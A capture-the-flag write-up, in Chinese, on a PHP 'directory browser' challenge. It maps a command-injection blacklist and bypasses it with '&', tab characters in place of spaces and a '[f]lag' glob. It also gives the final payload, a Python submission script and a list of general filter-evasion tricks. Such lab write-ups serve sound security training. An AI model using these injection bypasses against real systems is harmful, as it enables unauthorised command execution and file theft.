# WP · [qsnctf] 目录浏览器 —— 命令注入 + 黑名单绕过（get flag）

> 分类：04-RCE与命令注入 ｜ 栈：Apache + PHP/7.2 ｜ 难度：入门级但黑名单测绘值得练
> 题目：`http://challenge.qsnctf.com:40567/index.php`
> **Flag：`flag{f9858616d16142878422275f518cf5c9}`**

---

## 0. 一句话思路

表单输入"目录路径" → 后端 `system("ls -la ".$directory)` 直接拼命令 → **命令注入**。
但有一张"字符 + 关键词"混合黑名单：空格、`; | $ ( ) \` ' \ < > * ? { }` 全拦，连 `cat/echo/flag/more/head/tail/bash/sh` 这些词也拦。
绕过三连：**`&` 分隔命令**（放行）+ **Tab 代空格**（tab 放行）+ **`/[f]lag` 字符类避关键词**（输入是 `[f]lag`，匹配 `/flag` 却不含连续 `flag` 字样）→ 用放行的 `grep` 把 flag 读出来。

---

## 1. 定性：这是命令注入

- 响应头 `Server: Apache/2.4.38` + `X-Powered-By: PHP/7.2.34` → 按铁律这是 **PHP 题**。
- 首页标题"目录浏览器"，表单 `POST` 字段 `directory`，提示"输入目录路径浏览内容，系统采用严格过滤、禁止输入危险字符"。
- 提交 `.` → 后端执行 `ls -la .`，输出区 `<pre class="command-output">` 列出 `index.php`、`style.css` → 确认是**把输入拼进 shell 命令** → 命令注入。

## 2. 测绘黑名单（最重要的一步）

先提交单字符 + 常见命令词，看哪些触发拦截文案"**危险字符。根据安全策略，操作已取消。**"（注意：页脚也写了"过滤机制，休想执行其他命令"，但那是常驻文案；**真正的拦截标志是"操作已取消"**）。

**被拦字符**：

| 字符 | 类别 |
|---|---|
| `空格` | 分隔符 |
| `;` `\|` `&`(误?实际放行) | 命令分隔 |
| `$` `` ` `` `'` `"`(放行) | 引用/变量 |
| `(` `)` `{` `}` | 语法 |
| `\` `<` `>` | 转义/重定向 |
| `*` `?` | 通配符 |

实测**放行**的：`&` `/` `"` `[` `]` `!` `~` `#` `@` `%` `^` `=` `+` `-` `.` `,` `:` 换行 制表

**被拦命令词**：`cat` `echo` `flag` `more` `head` `tail` `bash` `sh`
**放行命令词**：`ls` `id` `whoami` `pwd` `php` `dir` `type` `grep` `find` `nc` `curl` `wget` `ping`

> 关键结论：黑名单是**字符级 + 词级**混合，而且**极其针对"读 flag"**——`cat`/`flag`/`*` 全封死，专门防"直接 `cat /flag`"。

## 3. 三招绕过

### 招一：`&` 分隔命令（不需要空格）
黑名单拦了 `;` `|` 但**漏了 `&`**。shell 里 `cmd1&cmd2` 表示"后台跑 cmd1、同时跑 cmd2"，`&` 前后不需要空格。
- payload `.&id` → 实际命令 `ls -la .&id` → 先后台列 `.`、再执行 `id` → 回显 `uid=33(www-data)` ✅ **命令注入坐实**。

### 招二：Tab 代替空格
空格被拦，但**制表符 `\t` 放行**（shell 把 tab 当空白）。所以命令内部的空格全用 tab 顶替。
- `grep . /flag` → 写成 `grep<TAB>.<TAB>/flag`。

### 招三：`[f]lag` 字符类避开关键词
这是本题最妙的绕过。`flag` 是整个字符串被词级黑名单拦，但只要输入里**不出现连续的 `flag`** 即可。
- 路径写成 `/[f]lag`：shell glob 的字符类 `[f]` 只匹配一个 `f`，整体匹配 `/flag`；但**输入字符串是 `[f]lag`，里面没有连续的 `flag` 字样** → 骗过词级黑名单 ✅
- 同理 `*` `?` 被拦，但 `[` `]` 放行，所以字符类是可行的通配替代。

## 4. 最终 payload

```
directory = .&grep<TAB>.<TAB>/[f]lag
```
（`<TAB>` 是真实制表符，URL 编码为 `%09`；`&` 编码为 `%26` 以免被当参数分隔）

拆解实际执行的 shell 命令：
```
ls -la . & grep . /flag
        │        └── 读 /flag 全部内容（. 匹配每行任意字符）
        └── 后台列当前目录（无关，只为不报错）
```

### 提交脚本（复现用）
```python
import urllib.request, urllib.parse, re, html
URL = "http://challenge.qsnctf.com:40567/index.php"
def post(d):
    data = urllib.parse.urlencode({"directory": d}).encode()
    req = urllib.request.Request(URL, data=data, headers={"User-Agent":"Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=15) as r:
        b = r.read().decode("utf-8","replace")
    m = re.search(r'<pre class="command-output">(.*?)</pre>', b, re.S)
    return html.unescape(m.group(1)) if m else "(无输出区)"
payload = '.&grep\t.\t/[f]lag'
print(post(payload))
```

输出区最后一行即为 flag：`flag{f9858616d16142878422275f518cf5c9}`

---

## 5. 这题该记住的（通用套路）

1. **命令注入先看"黑名单漏了哪个分隔符"**：`;` `|` 被拦就试 `&`、`||`、`&&`、换行 `%0a`、反引号。本题 `&` 漏网。
2. **空格被拦 → 用 Tab / 换行 / `${IFS}`(若 `$` 放行) / `<`(若放行) 替代**。本题 Tab 放行最稳。
3. **关键词黑名单（cat/flag/...）用"字符类 + 拼接"绕**：
   - `/[f]lag` 代替 `/flag`（字符类避开连续字符串匹配）
   - 也可用双引号拼接 `" /f"."lag "`（本题因 `(` `)` 被拦，php 法走不通，但 grep 法无需括号）
4. **读文件命令不止 `cat`**：`grep`/`sed`/`awk`/`sort`/`rev` 等都可读内容，本题 `grep . file` 直接出全文。
5. **判断拦截别被页面常驻文案骗**：页脚"休想执行"是装饰；真正的拦截标志是"操作已取消"这句动态提示。

## 6. 同类题位置
- 同分类：`WP-[NSSCTF]Ping-Ping-命令注入.md`、`WP-[CTF-Show]嵌套eval的RCE.md`、`WP-[CTF-Show]变量的变量eval.md`
- 笔记：`Web笔记04-RCE常用命令速查.md`、`Web笔记05-发请求的几种方式与命令注入重点.md`
